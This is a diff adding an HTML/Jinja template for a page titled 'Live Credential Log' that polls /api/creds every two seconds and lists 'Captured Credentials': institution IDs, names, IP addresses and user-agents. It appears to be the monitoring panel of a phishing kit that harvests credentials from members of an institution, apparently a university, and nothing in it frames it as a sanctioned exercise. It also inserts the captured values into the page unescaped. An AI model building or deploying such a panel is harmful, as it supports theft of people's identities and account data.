@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Live Credential Log</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/bootstrap.min.css') }}">
+    <script src="{{ url_for('static', filename='js/jquery.min.js') }}"></script>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        h2 { margin-bottom: 20px; }
+        table { width: 100%; }
+        th, td { padding: 8px 12px; text-align: left; }
+        th { background-color: #c8102e; color: white; }
+        tr:nth-child(even) { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h2>Captured Credentials</h2>
+    <table class="table table-bordered" id="creds-table">
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>UH ID</th>
+                <th>First Name</th>
+                <th>Last Name</th>
+                <th>IP Address</th>
+                <th>User-Agent</th>
+            </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+
+    <script>
+        function fetchCreds() {
+            $.getJSON("/api/creds", function(data) {
+                let tbody = $("#creds-table tbody");
+                tbody.empty();
+                data.forEach(entry => {
+                    tbody.append(`
+                        <tr>
+                            <td>${entry.timestamp}</td>
+                            <td>${entry.uh_id}</td>
+                            <td>${entry.first_name}</td>
+                            <td>${entry.last_name}</td>
+                            <td>${entry.ip}</td>
+                            <td style="max-width: 300px; overflow-wrap: break-word;">${entry.ua}</td>
+                        </tr>
+                    `);
+                });
+            });
+        }
+
+        setInterval(fetchCreds, 2000);
+        fetchCreds();
+    </script>
+</body>
+</html>
